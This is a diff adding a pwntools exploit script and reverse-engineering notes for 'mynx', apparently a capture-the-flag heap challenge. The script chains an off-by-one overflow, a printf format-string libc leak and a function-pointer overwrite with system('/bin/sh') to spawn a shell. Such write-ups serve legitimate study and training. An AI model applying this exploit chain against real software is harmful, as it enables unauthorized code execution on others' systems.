@@ -3,6 +3,7 @@
 from pwn import *
 
 exe = ELF("./mynx")
+libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
 
 context.binary = exe
 
@@ -17,8 +18,79 @@ def conn():
 def main():
     r = conn()
 
-    # good luck pwning :)
+    def add_ascii(filter, data):
+    	r.recvuntil("> ")
+    	r.sendline("1")
+    	r.recvuntil("> ")
+    	r.sendline(str(filter))
+    	r.recvuntil("enter your ascii art >>>")
+    	r.send(data)
 
+    def browse_ascii():
+    	r.recvuntil("> ")
+    	r.sendline("2")
+
+    def add_comment(id, comment):
+    	r.recvuntil("> ")
+    	r.sendline("3") # select ascii art
+    	r.recvuntil("enter ascii art id")
+    	r.recvuntil("> ")
+    	r.sendline(str(id))
+    	r.recvuntil("> ")
+    	r.sendline("1")
+    	r.recvuntil("enter your comment")
+    	r.send(comment)
+    	r.sendline("0") # back to main menu
+
+    def remove_comments(id):
+    	r.recvuntil("> ")
+    	r.sendline("3")
+    	r.recvuntil("enter ascii art id")
+    	r.recvuntil("> ")
+    	r.sendline(str(id))
+    	r.recvuntil("> ")
+    	r.sendline("2")
+    	r.sendline("0")
+
+    def apply_filter(id):
+    	r.recvuntil("> ")
+    	r.sendline("3")
+    	r.recvuntil("enter ascii art id")
+    	r.recvuntil("> ")
+    	r.sendline(str(id))
+    	r.recvuntil("> ")
+    	r.sendline("3")
+    	r.sendline("0")
+
+
+    # set up the table
+    add_ascii(0, "A"*0xf7)
+    add_comment(1, "B"*0xfb)
+    add_ascii(0, "C"*0xf7)
+    add_comment(1, "B"*0xfb)
+    add_comment(2, p32(exe.symbols['printf']) +  "%8$x")
+
+    # switch entry 2 with its comment -> overwrite the function ptr -> call printf to read the stack
+    remove_comments(1)
+    add_comment(1, "B"*0xfb + "\x37")
+    add_comment(1, "B"*0xfb + "\x49")
+
+    # leak libc address
+    apply_filter(2)
+    leak = int(r.recvn(8), 16)
+    libc.address = leak - 0x1b23dc
+    log.info("libc base address: {}".format(hex(libc.address)))
+
+
+    # switch again, and this time overwrite the function ptr with system and +9 with "/bin/sh\x00"
+    remove_comments(2)
+    add_comment(2, p32(libc.symbols['system']) + "/bin/sh\x00")
+    remove_comments(1)
+    add_comment(1, "B"*0xfb + "\x49")
+    add_comment(1, "B"*0xfb + "\x37")
+    apply_filter(2)
+
+    #gdb.attach(r)
     r.interactive()
 
 
@@ -79,10 +151,10 @@ CNT_0804a940 - entry counter
 		1. Add comment
 			- calls select_chunk and select_minichunk
 			- [0] represents the in-use field which becomes 0x37 / 0x36
-		- [1] represents CNT_0804a940 (entry nr) before it is incremented
-		- [5] read our input 0xf7 - OFF BY ONE OVERFLOW!!!!!!!!!!!!!!!!!!!
+			- [1] represents CNT_0804a940 (entry nr) before it is incremented
+			- [5] read our input 0xfc - OFF BY ONE OVERFLOW!!!!!!!!!!!!!!!!!!!
 
-		2. Remove all comments - DOESN'T ACTUALLY REMOVE ALL COMMENTS
+		2. Remove all comments - from an ascii art
 
 			- searches through all minichunks
 			- if (*miniChunk == 0x37) AND (*(int *)(miniChunk + 1) == id) - calls unset_inusebyte_decrement_cnt(chunk of minichunk)
@@ -101,13 +173,11 @@ CNT_0804a940 - entry counter
 										if allocated (& 1 != 0)  - memcpy(minichunk1 + 1,__src,0x100); // avoids the first byte??? doesn't check if it copies comment or ascii art ; copies the entry nr
 																 - *minichunk1 = *minichunk1 | 1;  // set inuse - but it can happen to comments AND ascii art ??????
 																 - *__src = 0;
-							- frees(chunk2)  // unsortedbin so libc address!
+							- frees(chunk2)  // unsortedbin so libc address! 
 
 
-			BASICALLY: smallWTF and bigWTF make some kind of consolidation!
-
-							imiplications that remove is not perfect because it doesn't check behind??
-
+			BASICALLY: smallWTF and bigWTF make some kind of consolidation! - imiplications that remove is not perfect because it doesn't check behind??
+					   incorrect copy? things aren't aligned because of minichunk1+1???
 
 		3. Apply filter
 			- calls function at [5] with [9] as argument    <--- overwrite to control the instruction pointer
@@ -118,9 +188,18 @@ CNT_0804a940 - entry counter
 
 Filter functions;
 
+	Filter 0 (inverse):
+		- bitwise nots every one of the 0xf7 characters
+
+	Filter 1 (LOLOLOL):
+		- LOLOLOLOL's our input
+
+	Filter 2 (case inversion):
+		- does what is says it does
 
 
 
 
 can unset bit with onebyte overflow -> 2 ptrs pointing to the same minichunk -> overwrite ptr
+I can already leak a little because puts and im writing next to the I byte thing
 '''
